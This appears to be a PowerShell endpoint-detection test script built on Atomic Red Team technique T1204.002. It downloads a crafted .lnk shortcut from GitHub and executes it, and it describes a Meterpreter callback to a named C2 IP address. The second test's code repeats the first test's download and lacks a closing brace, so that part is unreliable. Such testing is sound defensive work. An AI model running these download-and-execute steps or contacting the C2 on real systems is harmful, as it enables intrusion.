# Function to display the logo
function Show-Logo {
    Write-Host @"                                                                           
                                                                                                @@@      
                                                                                             @@@ @ @@@@  
                                                                                           @@@ @ @@@ @   
                                                                                        @@@@ @@@@ @  @@@ 
                                                                                     /@@@ @@@@  @@@@@ @  
                                                                                  #@@. @@@@ @@@@@ &@     
                                                                               @@@@@@@@  @@@   @@@@@@&   
                                                                            @@@@@@@@@@@@  @@@@@@ @@      
                                                                         @@@@@@@@@@@@@@@@   @@@@@@       
                                                                      @@@@@@@@@@@@@ %@@@@@   @@          
                                                  @@               @@@@    @@@@@@@@   @@@@@@@.@          
                                             @@@@ @@@@          @@@@       @@@@@@@@      @@              
                                          @@@     @@@@@@      @@@@       @@@@@@@@@@@@  @                 
                                       @@@@            @@@   @@@       @@@@@@@@@@@@@@ @                  
                                       @@               @@@ @@@       @@@@@@@  @@@@                      
                                        @@              @@@@@@      @@@@@@@@@@  @@                       
                                         @@              @@@@      @@@@@@@@@@@@                          
                                          @(          /@@@        @@@@@    @                             
                                          @@       @@@@          @@@@@@@@ @                              
                                          @ @@@@@@@#             /@@@@@@@                                
                                        @@@@@@@                    @@@@ @                                
                                      @  @@@@@                       @@@@                                
                                    @  @@@@             @@/            @@@@@@                            
                                   @ %@@ @@  @@@@@@@@,   @@         ,@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                                    @ @@         @@@@@  @@@@@@@@@@@  ,@@@@@@@@@@@@,@@% ,@@@@@@@          
                                     @           @@@@@ @@                  &@@& @@  @@@@@@               
                                                @@@@@@@*                                                 
                                               @@@ @@                                                    
                                            @@   @                                                       
    TRIFIDENT                           @@ @@@@@                                                         
Security Validation Tests v0.1              @                       
"@
}

# Function to run commands
function Run-AtomicTest1 {
    Write-Host "
    Test 1: T1204.002 : User Execution: Defanged malicious .lnk file
    ------------------------------------
    
    LNK files are based on the Shell Link Binary file format, also known as Windows
    shortcuts. But what seems a relatively simple ability to execute other binaries 
    on the    system can inflict great harm when abused by threat actors. Microsoft’s 
    decision to block macros by default for files downloaded from the internet in Office 
    applications provoked malware developers to shift to other techniques.
    
    This test downloads a crafted .lnk file from Atomic RedTeam's github repository, and then attempts to execute it. 
    When executed, the .lnk file attempts to download a clean copy of Putty (a windows based ssh client) as 'a.exe' 
    and attempts to execute it.

    Expected Outcome: SentinelOne detects, alerts, and quarantines the LNK file, however
    Putty still executes.
    
    "
    
    # First URL to download
    $firstUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
    
    # Second URL to download (provide your own URL)
    $secondUrl = "YOUR_SECOND_URL_HERE"

    $confirmation = Read-Host "Do you want to proceed with test 1? (Y/N)"
    if ($confirmation -ne "Y") {
            Write-Host "Exiting script..."
            return
        }
    
    try {
        # Try downloading the file from the first URL
        Invoke-WebRequest -OutFile $env:Temp\test10.lnk $firstUrl -ErrorAction Stop
        Write-Host "File downloaded successfully from $firstUrl"
    }
    catch {
        # If an error occurs, display the error message
        Write-Host "Error downloading file from $($firstUrl): $_"
        Write-Host "Trying second URL..."
        
        try {
            # Try downloading the file from the second URL
            Invoke-WebRequest -OutFile $env:Temp\test10.lnk $secondUrl -ErrorAction Stop
            Write-Host "File downloaded successfully from $secondUrl"
        }
        catch {
            # If an error occurs again, display the error message and exit
            Write-Host "Error downloading file from $($secondUrl): $_"
            Write-Host "Failed to download the file from both URLs. Updating log information"
            return
        }
    }

    # The test file has been saved to $temp\test10.lnk
    $file1 = "$env:Temp\test10.lnk"

    # Execute the downloaded file
    Start-Process $file1

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Kill the process named "a.exe"
    taskkill /IM a.exe /F

    # Removing all downloaded or created files
    $file1 = "$env:Temp\test10.lnk"
    $file2 = "$env:Temp\a.exe"
    Remove-Item $file1 -ErrorAction Ignore
    Remove-Item $file2 -ErrorAction Ignore
}

function Run-AtomicTest2 {
    Write-Host "
    Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter
    ------------------------------------
    
    Meterpreter is a Metasploit attack payload that provides an interactive shell to the
    attacker from which to explore the target machine and execute code. Meterpreter is
    deployed using in-memory DLL injection. As a result, Meterpreter resides entirely in
    memory and writes nothing to disk. It communicates over the stager socket and provides
    a comprehensive client-side Ruby API. It features command history, tab completion,
    channels, and more.

    Shell.exe attempts to shovel a meterpreter shell from the host machine to a Trifident
    owned C2 server over HTTP (port 9191) located in Azure at the IP address of
    172.174.245.183. The C2 meterpreter listener is disabled by default on our C2 server. If
    execution succeeds, the C2 channel will not be established. 
    
    If you would like to validate
    the C2 server is non-operational prior to execution, you can perform the following test:
    nmap -p 9191 172.174.245.183
    
    *Note: Other ports may be open as this C2 server is used for multiple engagements.

    Expected Outcome: SentinelOne detects, alerts, and quarantines shell.exe without execution.
    
    "
    
    # First URL to download
    $firstUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
    
    # Second URL to download (provide your own URL)
    $secondUrl = "YOUR_SECOND_URL_HERE"

    $confirmation = Read-Host "Do you want to proceed with test 2? (Y/N)"
    if ($confirmation -ne "Y") {
            Write-Host "Exiting script..."
            return
        }
    
    try {
        # Try downloading the file from the first URL
        Invoke-WebRequest -OutFile $env:Temp\test10.lnk $firstUrl -ErrorAction Stop
        Write-Host "File downloaded successfully from $firstUrl"
    }
    catch {
        # If an error occurs, display the error message
        Write-Host "Error downloading file from $($firstUrl): $_"
        Write-Host "Trying second URL..."
        
        try {
            # Try downloading the file from the second URL
            Invoke-WebRequest -OutFile $env:Temp\test10.lnk $secondUrl -ErrorAction Stop
            Write-Host "File downloaded successfully from $secondUrl"
        }
        catch {
            # If an error occurs again, display the error message and exit
            Write-Host "Error downloading file from $($secondUrl): $_"
            Write-Host "Failed to download the file from both URLs. Updating log information"
            return
        }
    }

# Call the function to display the logo and begin tests
Show-Logo
Run-AtomicTest1
Run-AtomicTest2
